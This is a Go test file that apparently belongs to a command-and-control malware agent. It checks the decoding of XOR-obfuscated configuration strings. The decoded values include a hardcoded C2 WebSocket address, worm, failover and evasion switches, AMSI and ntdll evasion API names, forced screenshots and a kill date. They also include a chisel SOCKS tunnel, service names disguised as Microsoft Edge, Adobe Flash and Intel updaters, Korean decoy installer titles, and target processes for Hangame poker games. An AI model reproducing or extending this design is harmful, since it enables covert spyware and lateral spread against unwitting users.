package main

import "testing"

// Regression guard: xob() must decode with the SAME 16-byte key that
// scripts/bake_secrets.py / scripts/xor_encode.py use to ENCODE. If the two
// sides drift, every baked config value in the binary silently becomes
// garbage (the 2026-09-20 1-byte-key bug — baked WSS URL, env var names,
// tokens all undecodable, agent deaf after reboot).
func TestXobMatchesBakeScripts(t *testing.T) {
	cases := []struct {
		name string
		enc  []byte
		want string
	}{
		{"baked_wss_primary", eWssURL, "wss://45.32.251.5:8443/agent"},
		{"lab_wss", eLabWss, "wss://127.0.0.1:8443/agent"},
		{"env_name_c2_server", eC2Server, "C2_SERVER"},
		{"env_name_psk", eC2PSK, "C2_PSK"},
		{"tg_api_base", eTgAPIBase, "https://api.telegram.org"},
		{"beacon_path", eBeaconPath, "/beacon"},
		{"agent_path", eAgentPath, "/agent"},
	}
	for _, c := range cases {
		if got := xob(c.enc); got != c.want {
			t.Errorf("%s: xob() = %q, want %q", c.name, got, c.want)
		}
	}
}

// Canonical round-trip guard for the name/disguise tables in xor_names.go.
// Every table must decode to the exact original string that shipped in the
// source before obfuscation (verified against .build backup + hangame_games.json).
// Catches re-encode typos (2026-09-21: 9 tables generated with wrong source text).
func TestXobNamesCanonical(t *testing.T) {
	cases := []struct {
		name string
		enc  []byte
		want string
	}{
		{"names:eVersionDefault", eVersionDefault, "1.4.4-lab-always-cmd"},
		{"names:eC2InsecureTLS", eC2InsecureTLS, "C2_INSECURE_TLS"},
		{"names:eC2Pcbang", eC2Pcbang, "C2_PCBANG"},
		{"names:eC2AgentDebug", eC2AgentDebug, "C2_AGENT_DEBUG"},
		{"names:eForceScreenshot", eForceScreenshot, "FORCE_SCREENSHOT"},
		{"names:eC2WormEnable", eC2WormEnable, "C2_WORM_ENABLE"},
		{"names:eC2Failover", eC2Failover, "C2_FAILOVER"},
		{"names:eC2FailoverThreshold", eC2FailoverThreshold, "C2_FAILOVER_THRESHOLD"},
		{"names:eC2LabTaskPrefix", eC2LabTaskPrefix, "C2Lab_"},
		{"names:eC2LabTmpPrefix", eC2LabTmpPrefix, "c2lab_"},
		{"names:eChiselSocksExe", eChiselSocksExe, "chisel_socks.exe"},
		{"names:eChiselToolPath", eChiselToolPath, "/tools/chisel.exe"},
		{"names:eSvcName", eSvcName, "DocViewerHelper"},
		{"names:eGameProfilePath", eGameProfilePath, "profiles/hangame_games.json"},
		{"names:eHangameProfileID", eHangameProfileID, "hangame-3-1-board-poker-v1-embedded"},
		{"names:eGameIDBaduki", eGameIDBaduki, "baduki"},
		{"names:eGameIDPoker7", eGameIDPoker7, "poker7"},
		{"names:eGameIDLas", eGameIDLas, "laspoker"},
		{"names:eGameIDDuel", eGameIDDuel, "duelpoker"},
		{"names:eGameIDHighLow", eGameIDHighLow, "highlow2"},
		{"names:eImgBaduki", eImgBaduki, "baduki.exe"},
		{"names:eImgPoker7", eImgPoker7, "poker7.exe"},
		{"names:eImgLasPoker", eImgLasPoker, "laspoker.exe"},
		{"names:eImgDuelPoker", eImgDuelPoker, "duelpoker.exe"},
		{"names:eImgDualPocker", eImgDualPocker, "dualpocker.exe"},
		{"names:eImgHighLow2", eImgHighLow2, "highlow2.exe"},
		{"names:eImgHgameSetup", eImgHgameSetup, "hangamestartersetup.exe"},
		{"names:eImgHanStarter", eImgHanStarter, "hanstarter.exe"},
		{"names:eImgHanStarter2", eImgHanStarter2, "hanstarter2.exe"},
		{"names:eTitleBaduki", eTitleBaduki, "한게임 바둑이"},
		{"names:eTitlePoker7", eTitlePoker7, "한게임 7포커"},
		{"names:eTitleLasPoker", eTitleLasPoker, "한게임 라스베가스 포커"},
		{"names:eTitleDuelPoker", eTitleDuelPoker, "한게임 듀얼포커"},
		{"names:eTitleHighLow", eTitleHighLow, "한게임 하이로우"},
		{"names:ePCBangDisp1", ePCBangDisp1, "Microsoft Edge Update"},
		{"names:ePCBangTask1", ePCBangTask1, "MicrosoftEdgeUpdateTask"},
		{"names:ePCBangDesc1", ePCBangDesc1, "Keeps Microsoft Edge up to date."},
		{"names:ePCBangFile1", ePCBangFile1, "EdgeUpdateCore.dll"},
		{"names:ePCBangDir1", ePCBangDir1, "Microsoft\\EdgeUpdate"},
		{"names:ePCBangDisp2", ePCBangDisp2, "Adobe Flash Update"},
		{"names:ePCBangTask2", ePCBangTask2, "AdobeFlashPlayerUpdateSvc"},
		{"names:ePCBangDesc2", ePCBangDesc2, "Checks for new versions of Adobe Flash Player."},
		{"names:ePCBangFile2", ePCBangFile2, "FlashUpdateCheck.dll"},
		{"names:ePCBangDir2", ePCBangDir2, "Adobe\\Flash Player\\Update"},
		{"names:ePCBangDisp3", ePCBangDisp3, "Intel Graphics Update"},
		{"names:ePCBangTask3", ePCBangTask3, "IntelGfxUpdate"},
		{"names:ePCBangDesc3", ePCBangDesc3, "Periodically checks for Intel graphics driver updates."},
		{"names:ePCBangFile3", ePCBangFile3, "GfxUpdate.dll"},
		{"names:ePCBangDir3", ePCBangDir3, "Intel\\Graphics\\Updates"},
		{"names:eDecoyExe1", eDecoyExe1, "EdgeUpdateHelper.exe"},
		{"names:eDecoyExe2", eDecoyExe2, "AdobeUpdateCheck.exe"},
		{"names:eDecoyExe3", eDecoyExe3, "IntelGFXHelper.exe"},
		{"names:eDecoyExe4", eDecoyExe4, "NVDisplayUpdate.exe"},
		{"names:eDecoyExe5", eDecoyExe5, "RealtekHDUpdate.exe"},
		{"names:eDecoyTitle1", eDecoyTitle1, "DirectX 최종 사용자 런타임 설치 안내"},
		{"names:eDecoyTitle2", eDecoyTitle2, "Microsoft Visual C++ 재배포 가능 패키지 설치 가이드"},
		{"names:eDecoyTitle3", eDecoyTitle3, "Adobe Flash Player 보안 업데이트 안내"},
		{"names:eDecoyTitle4", eDecoyTitle4, "NVIDIA 그래픽 드라이버 업데이트 설치 도움말"},
		{"names:eUADefault", eUADefault, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},
		{"names:eEvKernel32", eEvKernel32, "kernel32.dll"},
		{"names:eEvToolhelpSnap", eEvToolhelpSnap, "CreateToolhelp32Snapshot"},
		{"names:eEvModuleFirst", eEvModuleFirst, "Module32FirstW"},
		{"names:eEvModuleNext", eEvModuleNext, "Module32NextW"},
		{"names:eEvCloseHandle", eEvCloseHandle, "CloseHandle"},
		{"names:eEvVirtualProtect", eEvVirtualProtect, "VirtualProtect"},
		{"names:eEvNtdll", eEvNtdll, "ntdll.dll"},
		{"names:eEvAmsi", eEvAmsi, "amsi.dll"},
		{"names:eC2Evasion", eC2Evasion, "C2_EVASION"},
		{"names:eGameGameFile", eGameGameFile, "hangame_games.json"},
		{"names:ePCBangReg2", ePCBangReg2, "AdobeFlashUpdateSvc"},
		{"names:ePCBangReg3", ePCBangReg3, "IntelGFXUpdate"},
		{"names:eAuthHeader", eAuthHeader, "X-Auth-Token"},
		{"names:eKillDateField", eKillDateField, "kill_date"},
		{"names:eStableIDField", eStableIDField, "stable_id"},
		{"names:eTokenEmptyMsg", eTokenEmptyMsg, "AGENT_TOKEN is empty — set C2_AUTH_TOKEN (or AGENT_TOKEN/AUTH_TOKEN); refusing to run without auth token"},
	}
	for _, c := range cases {
		if got := xob(c.enc); got != c.want {
			t.Errorf("%s: xob() = %q, want %q", c.name, got, c.want)
		}
	}
}
